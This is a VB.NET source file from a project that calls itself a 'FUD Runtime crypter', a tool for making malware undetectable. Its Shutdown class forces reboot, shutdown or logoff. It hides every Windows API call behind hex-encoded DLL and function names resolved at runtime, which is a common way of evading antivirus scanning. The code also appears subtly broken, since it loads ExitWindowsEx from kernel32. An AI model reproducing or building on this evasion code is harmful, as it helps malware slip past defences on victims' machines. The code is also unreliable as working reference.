'=============================================================================
'                  Crypter.NET - FUD Runtime crypter 
'                 Copyright (C) 2010 fLaSh - Carlos.DF 
'                        <c4rl0s.pt@gmail.com> 
'                     <http://www.flash1337.com/>
' THIS SOFTWARE IS PROVIDED BY THE AUTHORS ``AS IS'' AND ANY EXPRESS OR
' IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
' OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
' IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY DIRECT, INDIRECT,
' INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
' NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
' DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
' THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
' (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
' THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'=============================================================================
Imports System.Runtime.InteropServices
Public Class Shutdown
    Inherits NativeDllCalls

    <StructLayout(LayoutKind.Sequential, Pack:=1)> _
    Private Structure TokPriv1Luid
        Public Count As Integer
        Public Luid As Long
        Public Attr As Integer
    End Structure

    '<DllImport("kernel32.dll", ExactSpelling:=True)> _
    'Private Shared Function GetCurrentProcess() As IntPtr
    'End Function
    Private Delegate Function GetCurrentProcess() As IntPtr

    'Private Declare Auto Function OpenProcessToken Lib "advapi32.dll" (ByVal h As IntPtr, ByVal acc As Integer, ByRef phtok As IntPtr) As Boolean
    Private Delegate Function OpenProcessToken(ByVal h As IntPtr, ByVal acc As Integer, ByRef phtok As IntPtr) As Boolean

    '<DllImport("advapi32.dll", SetLastError:=True)> _
    'Private Shared Function LookupPrivilegeValue(ByVal host As String, ByVal name As String, ByRef pluid As Long) As Boolean
    'End Function
    Private Delegate Function LookupPrivilegeValue(ByVal host As String, ByVal name As String, ByRef pluid As Long) As Boolean

    'Private Declare Auto Function AdjustTokenPrivileges Lib "advapi32.dll" (ByVal iHtok As IntPtr, ByVal disall As Boolean, ByRef newst As TokPriv1Luid, ByVal len As Integer, ByVal prev As IntPtr, ByVal relen As IntPtr) As Boolean
    Private Delegate Function AdjustTokenPrivileges(ByVal iHtok As IntPtr, ByVal disall As Boolean, ByRef newst As TokPriv1Luid, ByVal len As Integer, ByVal prev As IntPtr, ByVal relen As IntPtr) As Boolean

    'Private Declare Auto Function ExitWindowsEx Lib "user32.dll" (ByVal flg As Integer, ByVal rea As Integer) As Boolean
    Private Delegate Function ExitWindowsEx(ByVal flg As Integer, ByVal rea As Integer) As Boolean

    Private Const SE_PRIVILEGE_ENABLED As Integer = &H2
    Private Const TOKEN_QUERY As Integer = &H8
    Private Const TOKEN_ADJUST_PRIVILEGES As Integer = &H20
    'Private Const SE_SHUTDOWN_NAME As String = "SeShutdownPrivilege"
    Private Const SE_SHUTDOWN_NAME_HEX As String = "0x536553687574646f776e50726976696c656765"
    Private Const EWX_LOGOFF As Integer = &H0
    Private Const EWX_SHUTDOWN As Integer = &H1
    Private Const EWX_REBOOT As Integer = &H2
    Private Const EWX_FORCE As Integer = &H4
    Private Const EWX_POWEROFF As Integer = &H8
    Private Const EWX_FORCEIFHUNG As Integer = &H10

    Private Const KERNEL32HEX As String = "0x6b65726e656c3332"
    Private Const ADVAPI32 As String = "0x6164766170693332"

    Private Sub DoExitWin(ByVal flg As Integer)
        Dim oTPL As TokPriv1Luid
        Dim bIsOk As Boolean
        Dim pHproc As IntPtr
        Dim iHtok As IntPtr

        Dim oGetCurrentProcess As GetCurrentProcess
        Dim oOpenProcessToken As OpenProcessToken
        Dim oLookupPrivilegeValue As LookupPrivilegeValue
        Dim oAdjustTokenPrivileges As AdjustTokenPrivileges
        Dim oExitWindowsEx As ExitWindowsEx

        oGetCurrentProcess = MyBase.DynamicCall(KERNEL32HEX, "0x47657443757272656e7450726f63657373", GetType(GetCurrentProcess))
        pHproc = oGetCurrentProcess.Invoke
        iHtok = IntPtr.Zero

        oOpenProcessToken = MyBase.DynamicCall(ADVAPI32, "0x4f70656e50726f63657373546f6b656e", GetType(OpenProcessToken))
        bIsOk = oOpenProcessToken.Invoke(pHproc, TOKEN_ADJUST_PRIVILEGES Or TOKEN_QUERY, iHtok)

        oTPL.Count = 1
        oTPL.Luid = 0
        oTPL.Attr = SE_PRIVILEGE_ENABLED

        oLookupPrivilegeValue = MyBase.DynamicCall(ADVAPI32, "0x4c6f6f6b757050726976696c65676556616c7565", GetType(LookupPrivilegeValue))
        bIsOk = oLookupPrivilegeValue.Invoke(Nothing, HexToString(SE_SHUTDOWN_NAME_HEX), oTPL.Luid)

        oAdjustTokenPrivileges = MyBase.DynamicCall(ADVAPI32, "0x41646a757374546f6b656e50726976696c65676573", GetType(AdjustTokenPrivileges))
        bIsOk = oAdjustTokenPrivileges.Invoke(iHtok, False, oTPL, 0, IntPtr.Zero, IntPtr.Zero)

        oExitWindowsEx = MyBase.DynamicCall(KERNEL32HEX, "0x4578697457696e646f77734578", GetType(ExitWindowsEx))
        bIsOk = oExitWindowsEx.Invoke(flg, 0)
    End Sub

    Public Sub Reboot()
        DoExitWin(EWX_REBOOT + EWX_FORCE)
    End Sub

    Public Sub ShutDown()
        DoExitWin(EWX_SHUTDOWN + EWX_FORCE)
    End Sub

    Public Sub LogOff()
        DoExitWin(EWX_LOGOFF + EWX_FORCE)
    End Sub

End Class
